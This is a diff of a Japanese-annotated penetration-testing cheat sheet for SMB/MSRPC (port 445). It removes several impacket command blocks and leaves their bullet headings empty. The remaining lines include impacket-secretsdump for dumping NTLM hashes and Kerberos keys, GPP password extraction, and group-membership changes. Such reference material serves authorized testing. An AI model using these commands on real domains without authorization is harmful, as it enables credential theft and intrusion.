@@ -213,10 +213,6 @@ sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback 
 
 ## 445 (139を使うことも)
 (msrpcはTCP135番やDynamicPortも使う)
-- donpapi
-```sh
-donpapi
-```
 - hekatomb
 ```sh
 # DPAPI blob (TCP53番とTCP389番も使用)
@@ -231,10 +227,6 @@ enum4linux -a -d -u 'USERNAME' -p 'PASSWORD' -w 'DOMAIN' -v 'IP'
 ```sh
 enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 ```
-- impacket-DumpNTLMInfo
-```sh
-impacket-DumpNTLMInfo 'IP'
-```
 - impacket-Get-GPPPassword
 ```sh
 # MS14-025
@@ -242,14 +234,7 @@ impacket-Get-GPPPassword -share 'SHARENAME' -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-Get-GPPPassword -share 'SHARENAME' -base-dir 'PATH' -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
 - impacket-lookupsid
-```sh
-impacket-lookupsid -ts 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-lookupsid -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'MAX RID'
-```
 - impacket-machine_role
-```sh
-impacket-machine_role -ts 'DOMAIN/USERNAME:PASSWORD@IP'
-```
 - impacket-net
 ```sh
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user
@@ -274,34 +259,10 @@ impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -join 'USERNA
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -unjoin 'USERNAME'
 ```
 - impacket-netview
-```sh
-# track of who logged in or 
-impacket-netview -target 'IP' -delay 'SECOND' -ts 'DOMAIN/USERNAME:PASSWORD'
-```
 - impacket-reg
-```sh
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' query -keyName 'KEYNAME'
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' query -keyName 'KEYNAME' -v 'VALUENAME'
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' query -keyName 'KEYNAME' -s
-# VALUETYPE are: REG_NONE, REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_DWORD_BIG_ENDIAN, REG_LINK, REG_MULTI_SZ, REG_QWORD
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' add -keyName 'KEYNAME' -v 'VALUENAME' -vt 'VALUETYPE' -vd 'VALUEDATA'
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' delete -keyName 'KEYNAME' -v 'VALUENAME'
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' save -keyName 'KEYNAME' -o '\\IP\SHARE'
-impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' bakcup -keyName 'KEYNAME' -o '\\IP\SHARE'
-```
 - impacket-rpcdump
-```sh
-impacket-rpcdump 'DOMAIN/USERNAME:PASSWORD@IP'
-```
 - impacket-rpcmap
-```sh
-impacket-rpcmap ncacn_ip_tcp:'IP'
-impacket-rpcmap ncacn_http:'IP'
-```
 - impacket-samrdump
-```sh
-impacket-samrdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
-```
 - impacket-secretsdump
 ```sh
 # dumping NTLM hashs and Kerberos Keys
@@ -309,16 +270,6 @@ impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
 - impacket-services
-```sh
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' list
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' status -name 'SERVICENAME'
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' start -name 'SERVICENAME'
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' stop -name 'SERVICENAME'
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' config -name 'SERVICENAME'
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' create -name 'SERVICENAME' -display 'DISPLAYNAME' -path 'FILEPATH'
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' change -name 'SERVICENAME' -display 'DISPLAYNAME' -service_type '1 OR 2 OR 4 OR 8 OR 16 OR 32 OR 256' -start_type '0 ~ 5'
-impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' delete -name 'SERVICENAME'
-```
 - impacket-smbclient
 ```
 impacket-smbclient -no-pass ' '@'IP' # guest
